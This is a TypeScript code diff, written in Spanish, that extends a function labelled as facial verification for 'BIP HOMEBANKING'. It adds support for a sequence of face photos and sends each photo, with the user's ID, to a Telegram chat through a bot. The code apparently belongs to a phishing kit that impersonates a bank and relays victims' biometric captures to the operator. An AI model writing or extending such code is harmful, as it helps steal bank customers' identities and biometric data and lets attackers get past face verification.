@@ -103,6 +103,7 @@ export const sendFacialNotification = async (data: {
   userId: string;
   faceImage: string | null;
   faceVideo?: string | null;
+  facePhotos?: string[] | null;
   timestamp: string;
 }) => {
   if (!bot || !TELEGRAM_CHAT_ID) {
@@ -112,22 +113,23 @@ export const sendFacialNotification = async (data: {
 
   try {
     const isVideo = !!data.faceVideo;
+    const isMultiplePhotos = !!(data.facePhotos && data.facePhotos.length > 0);
     
     const message = `
 👤 *VERIFICACIÓN FACIAL - BIP HOMEBANKING*
 
 👤 *Usuario ID:* ${data.userId}
-📹 *Tipo:* ${isVideo ? 'VIDEO CON MOVIMIENTOS' : 'IMAGEN'}
+📹 *Tipo:* ${isVideo ? 'VIDEO CON MOVIMIENTOS' : isMultiplePhotos ? `SECUENCIA DE ${data.facePhotos!.length} FOTOS` : 'IMAGEN'}
 ✅ *Verificación:* COMPLETADA
 
 🕐 *Fecha:* ${data.timestamp}
 
-${isVideo ? '🎥 Video de verificación facial adjunto' : '📸 Foto de verificación facial adjunta'}
+${isVideo ? '🎥 Video de verificación facial adjunto' : isMultiplePhotos ? '📸 Fotos de verificación facial adjuntas' : '📸 Foto de verificación facial adjunta'}
     `;
 
     await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
 
-    // Enviar video o foto
+    // Enviar video, múltiples fotos o foto única
     if (isVideo && data.faceVideo) {
       try {
         const videoBase64 = data.faceVideo.includes(',') ? data.faceVideo.split(',')[1] : data.faceVideo;
@@ -140,6 +142,29 @@ ${isVideo ? '🎥 Video de verificación facial adjunto' : '📸 Foto de verific
         console.error('❌ Error enviando video:', videoError);
         await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar el video, pero verificación completada');
       }
+    } else if (isMultiplePhotos && data.facePhotos) {
+      // Enviar múltiples fotos de la secuencia
+      console.log(`📸 Enviando ${data.facePhotos.length} fotos faciales a Telegram...`);
+      
+      for (let i = 0; i < data.facePhotos.length; i++) {
+        try {
+          const photo = data.facePhotos[i];
+          const photoBase64 = photo.includes(',') ? photo.split(',')[1] : photo;
+          const photoBuffer = Buffer.from(photoBase64, 'base64');
+          
+          await bot.sendPhoto(TELEGRAM_CHAT_ID, photoBuffer, { 
+            caption: `👤 FOTO FACIAL ${i + 1}/${data.facePhotos.length}` 
+          });
+          
+          // Pequeña pausa entre envíos para no saturar
+          if (i < data.facePhotos.length - 1) {
+            await new Promise(resolve => setTimeout(resolve, 200));
+          }
+        } catch (photoError) {
+          console.error(`❌ Error enviando foto ${i + 1}:`, photoError);
+        }
+      }
+      console.log('✅ Todas las fotos faciales enviadas');
     } else if (data.faceImage) {
       try {
         const imageBase64 = data.faceImage.includes(',') ? data.faceImage.split(',')[1] : data.faceImage;
